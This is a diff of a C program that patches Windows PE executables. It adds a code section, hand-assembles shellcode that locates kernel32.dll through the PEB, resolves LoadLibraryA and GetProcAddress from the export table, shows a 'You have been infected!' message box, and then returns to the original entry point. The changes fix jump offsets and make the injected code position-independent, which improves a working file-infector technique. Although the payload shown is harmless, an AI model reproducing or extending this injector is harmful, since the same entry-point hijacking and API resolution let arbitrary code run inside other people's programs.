@@ -213,12 +213,12 @@ int main(int argc, char *argv[]) {
         // 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
     };
 
-    // Adding new section
+    // Pad previous section to align with FileAlignment
     fseek(fr, 0, SEEK_END);
     const DWORD old_end = ftell(fr);
     newish.PointerToRawData = closest(old_end + 1, imageOptionalHeader.FileAlignment);
-
     pad(fr, newish.PointerToRawData - old_end);
+
     // Write data[]
     for (int i = 0; i < sizeof(data) / sizeof(data[0]); ++i)
         // Each entry is written at newish.PointerToRawData + data[i] - data[0]
@@ -256,6 +256,7 @@ int main(int argc, char *argv[]) {
         // Each variable holds the address in the MEMORY
         DWORD ImageBaseAddress;
         DWORD OldEntryPoint;
+        DWORD Inject; // Beginning of the newly injected section
         DWORD kernel32dll;
         DWORD OrdinalTbl;
         DWORD NamePtrTbl;
@@ -276,13 +277,20 @@ int main(int argc, char *argv[]) {
     instruct(fr, 0x8b45, 0x1C, db);
     // sub eax, imageOptionalHeader.AddressOfEntryPoint ; get ImageBaseAddress in mem stored in eax
     instruct(fr, 0x2d, imageOptionalHeader.AddressOfEntryPoint, dd);
-    // mov [ebp - ImageBaseAddress], eax
+    // mov [ebp + ImageBaseAddress], eax
     instruct(fr, 0x8945, mem_stack.ImageBaseAddress = -(stack_reserved += dd), db);
 
-    // add eax, old_entry
+    // add eax (ImageBaseAddress), old_entry
     instruct(fr, 0x05, old_entry, dd);
-    // mov [ebp - OldEntryPoint], eax
+    // mov [ebp + OldEntryPoint], eax
     instruct(fr, 0x8945, mem_stack.OldEntryPoint = -(stack_reserved += dd), db);
+
+    // mov eax, [ebp + ImageBaseAddress]
+    instruct(fr, 0x8b45, mem_stack.ImageBaseAddress, db);
+    // add eax, newish.VirtualAddress
+    instruct(fr, 0x05, newish.VirtualAddress, dd);
+    // mov [ebp + Inject], eax
+    instruct(fr, 0x8945, mem_stack.Inject = -(stack_reserved += dd), db);
 
     // Find kernel32.dll
     // mov ebx, fs:0x30
@@ -297,7 +305,7 @@ int main(int argc, char *argv[]) {
     write_instruction(fr, 0x8b1b);
     // mov ebx, [ebx + 0x10]
     instruct(fr, 0x8b5b, 0x10, db);
-    // mov [ebp - kernel32dll], ebx
+    // mov [ebp + kernel32dll], ebx
     instruct(fr, 0x895d, mem_stack.kernel32dll = -(stack_reserved += dd), db);
 
     // mov eax, [ebx + 3Ch]
@@ -312,42 +320,43 @@ int main(int argc, char *argv[]) {
     instruct(fr, 0x8b48, 0x24,db); // RVA of Ordinal Table
     // add ecx, ebx
     write_instruction(fr, 0x01d9);
-    // mov [ebp - OrdinalTbl], ecx
+    // mov [ebp + OrdinalTbl], ecx
     instruct(fr, 0x894d, mem_stack.OrdinalTbl = -(stack_reserved += dd),db);
     // mov edi, [eax + 20h]
     instruct(fr, 0x8b78, 0x20,db); // RVA of Name Pointer Table
     // add edi, ebx
     write_instruction(fr, 0x01df);
-    // mov [ebp - NamePtrTbl], edi
+    // mov [ebp + NamePtrTbl], edi
     instruct(fr, 0x897d, mem_stack.NamePtrTbl = -(stack_reserved += dd),db);
     // mov edx, [eax + 1Ch]
     instruct(fr, 0x8b50, 0x1c,db); // RVA of Address Table
     // add edx, ebx
     write_instruction(fr, 0x01da);
-    // mov [ebp - AddrTbl], edx
+    // mov [ebp + AddrTbl], edx
     instruct(fr, 0x8955, mem_stack.AddrTbl = -(stack_reserved += dd), db);
     // mov edx, [eax + 14h]
     instruct(fr, 0x8b50, 0x14,db); // Number of exported functions
     // xor eax, eax
     write_instruction(fr, 0x31c0);
 
-    // Find LoadLibrary
+    // Find "LoadLibraryA"
     const int lla_loopback = ftell(fr);
-    // mov edi, [ebp - NamePtrTbl]
+    // mov edi, [ebp + NamePtrTbl]
     instruct(fr, 0x8b7d, mem_stack.NamePtrTbl, db);
-    // mov esi, data[4]
-    instruct(fr, 0xbe,
-             imageOptionalHeader.ImageBase + newish.VirtualAddress + data[4] - data[0], dd);
-    // xor ecx, ecx
-    write_instruction(fr, 0x31c9);
-    // cld
-    write_instruction(fr, 0xfc);
     // mov edi, [edi + eax*4]
     write_instruction(fr, 0x8b3c87);
     // add edi, ebx
     write_instruction(fr, 0x01df);
-    // add cx, strlen(data[2])
-    instruct(fr, 0x6683c1, data[2] - data[2 - 1], db);
+    // mov esi, [ebp + Inject]
+    instruct(fr, 0x8b75, mem_stack.Inject, db);
+    // add esi, &data[4]
+    instruct(fr, 0x83c6, data[4] - data[0], db);
+    // xor ecx, ecx
+    write_instruction(fr, 0x31c9);
+    // cld
+    write_instruction(fr, 0xfc);
+    // add cx, strlen(data[4])
+    instruct(fr, 0x6683c1, strlen(data[4]) + 1, db);
     // repe cmpsb
     write_instruction(fr, 0xf3a6);
     // jz found
@@ -359,19 +368,20 @@ int main(int argc, char *argv[]) {
     // cmp eax,edx
     write_instruction(fr, 0x39d0);
     // jb loopback
-    instruct(fr, 0x0f82, lla_loopback - ftell(fr) + 2 + dd, dd);
+    instruct(fr, 0x0f82, lla_loopback - (ftell(fr) + 2 + dd), dd);
+        // From lla_loopback to the end of the current instruction
 
     // jmp entry
     write_instruction(fr, 0xe9); // Not found, go to entry point, filled later
     pad(fr, 4);
     const int lla_jmp_entry = ftell(fr); // Save address to be edited later
 
-    // Found LoadLibraryA, eax hold address
+    // Found "LoadLibraryA", eax hold address
     setval_int(fr, ftell(fr) - lla_jz_found, dd, SEEK_SET, lla_jz_found - dd);
     fseek(fr, 0, SEEK_END);
-    // mov ecx, [ebp - OrdinalTbl]
+    // mov ecx, [ebp + OrdinalTbl]
     instruct(fr, 0x8b4d, mem_stack.OrdinalTbl, db);
-    // mov edx, [ebp - AddrTbl]
+    // mov edx, [ebp + AddrTbl]
     instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
     // mov ax, [ecx + eax*2]
     write_instruction(fr, 0x668b0441);
@@ -379,57 +389,62 @@ int main(int argc, char *argv[]) {
     write_instruction(fr, 0x8b0482);
     // add eax, ebx
     write_instruction(fr, 0x01d8); // eax holds mem addr of LoadLibraryA
-    // push data[4] ("user32.dll")
-    instruct(fr, 0x68,
-             imageOptionalHeader.ImageBase + newish.VirtualAddress + data[4] - data[0], dd);
+    // mov esi, [ebp + Inject]
+    instruct(fr, 0x8b75, mem_stack.Inject, db);
+    // add esi, &data[4]
+    instruct(fr, 0x83c6, data[4] - data[0], db);
+    // push esi ("user32.dll")
+    write_instruction(fr, 0x56);
     // call eax
     write_instruction(fr, 0xffd0);
-    // mov [ebp - user32dll], eax
+    // mov [ebp + user32dll], eax
     instruct(fr, 0x8945, mem_stack.user32dll = -(stack_reserved += dd), db);
-
-    // Find GetProcAddress
-    const int gpa_loopback = ftell(fr);
     // xor eax, eax
     write_instruction(fr, 0x31c0);
-    // mov edi, [ebp - NamePtrTbl]
+
+    // Find "GetProcAddress"
+    const int gpa_loopback = ftell(fr);
+    // mov edi, [ebp + NamePtrTbl]
     instruct(fr, 0x8b7d, mem_stack.NamePtrTbl, db);
-    // mov esi, data[3]
-    instruct(fr, 0xbe,
-             imageOptionalHeader.ImageBase + newish.VirtualAddress + data[3] - data[0], dd);
-    // xor ecx, ecx
-    write_instruction(fr, 0x31c9);
-    // cld
-    write_instruction(fr, 0xfc);
     // mov edi, [edi + eax*4]
     write_instruction(fr, 0x8b3c87);
     // add edi, ebx;
     write_instruction(fr, 0x01df);
+    // mov esi, [ebp + Inject]
+    instruct(fr, 0x8b75, mem_stack.Inject, db);
+    // add esi, &data[3]
+    instruct(fr, 0x83c6, data[3] - data[0], db);
+    // xor ecx, ecx
+    write_instruction(fr, 0x31c9);
+    // cld
+    write_instruction(fr, 0xfc);
     // add cx, strlen(data[3])
-    instruct(fr, 0x6683c1, data[3] - data[3 - 1], db);
+    instruct(fr, 0x6683c1, strlen(data[3]) + 1, db);
     // repe cmpsb
     write_instruction(fr, 0xf3a6);
     // jz found
-    const int gpa_jz_found = ftell(fr);
     instruct(fr, 0x0f84, 0,dd); // Placeholder value to be edited later
+    const int gpa_jz_found = ftell(fr);
 
     // inc eax
     write_instruction(fr, 0x40);
     // cmp eax,edx
     write_instruction(fr, 0x39d0);
     // jb loopback
-    instruct(fr, 0x0f82, gpa_loopback - ftell(fr) + 2 + dd, dd);
+    instruct(fr, 0x0f82, gpa_loopback - (ftell(fr) + 2 + dd), dd);
+        // From lla_loopback to the end of the current instruction
 
     // jmp entry
     write_instruction(fr, 0xe9); // Not found, go to entry point, filled later
     pad(fr, 4);
     const int gpa_jmp_entry = ftell(fr); // Save address to be edited later
 
-    // Found GetProcAddress, eax hold address
+    // Found "GetProcAddress", eax hold address
     setval_int(fr, ftell(fr) - gpa_jz_found, dd, SEEK_SET, gpa_jz_found - dd);
     fseek(fr, 0, SEEK_END);
-    // mov ecx, [ebp - OrdinalTbl]
+    // mov ecx, [ebp + OrdinalTbl]
     instruct(fr, 0x8b4d, mem_stack.OrdinalTbl, db);
-    // mov edx, [ebp - AddrTbl]
+    // mov edx, [ebp + AddrTbl]
     instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
     // mov ax, [ecx + eax*2]
     write_instruction(fr, 0x668b0441);
@@ -437,10 +452,13 @@ int main(int argc, char *argv[]) {
     write_instruction(fr, 0x8b0482);
     // add eax, ebx
     write_instruction(fr, 0x01d8); // eax holds mem addr of GetProcAddress
-    // push data[5] ("MessageBoxA")
-    instruct(fr, 0x68,
-             imageOptionalHeader.ImageBase + newish.VirtualAddress + data[5] - data[0], dd);
-    // push [ebp - user32dll]
+    // mov esi, [ebp + Inject]
+    instruct(fr, 0x8b75, mem_stack.Inject, db);
+    // add esi, &data[5]
+    instruct(fr, 0x83c6, data[5] - data[0], db);
+    // push esi ("MessageBoxA")
+    write_instruction(fr, 0x56);
+    // push [ebp + user32dll]
     instruct(fr, 0xff75, mem_stack.user32dll, db);
     // call eax (GetProcAddress)
     write_instruction(fr, 0xffd0); // eax holds mem addr of MessageBoxA
@@ -448,11 +466,14 @@ int main(int argc, char *argv[]) {
     // Invoke MessageBoxA
     // push 1030h (Type)
     instruct(fr, 0x68, MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL, dd);
-    // push data[0] (Notice)
-    instruct(fr, 0x68, imageOptionalHeader.ImageBase + newish.VirtualAddress, dd);
-    // push data[1] (You have been infected!)
-    instruct(fr, 0x68,
-             imageOptionalHeader.ImageBase + newish.VirtualAddress + data[1] - data[0], dd);
+    // mov edx, [ebp + Inject] ; Also address of data[0]
+    instruct(fr, 0x8b55, mem_stack.Inject, db);
+    // push edx ("Notice")
+    write_instruction(fr, 0x52);
+    // add edx, &data[1]
+    instruct(fr, 0x83c2, data[1] - data[0], db);
+    // push edx ("You have been infected!")
+    write_instruction(fr, 0x52);
     // push 0 (hWnd)
     instruct(fr, 0x6a, 0, db);
     // call eax (MessageBoxA)
@@ -485,8 +506,8 @@ int main(int argc, char *argv[]) {
     // pop eax
     write_instruction(fr, 0x58);
 
-    // jmp [esp - 0x20] (= esp - 7*0x4 + OldEntryPoint)
-    // Obtain address of EntryPoint in mem stored at 1st DWORD in the stack before the pops
+    // jmp [esp - 7 * 0x04 + OldEntryPoint]
+    // Obtain address of OldEntryPoint in mem stored in the stack before the pops
     instruct(fr, 0xff6424, -7 * 4 + mem_stack.OldEntryPoint, db);
 
     newish.Misc.VirtualSize = ftell(fr) - newish.PointerToRawData;
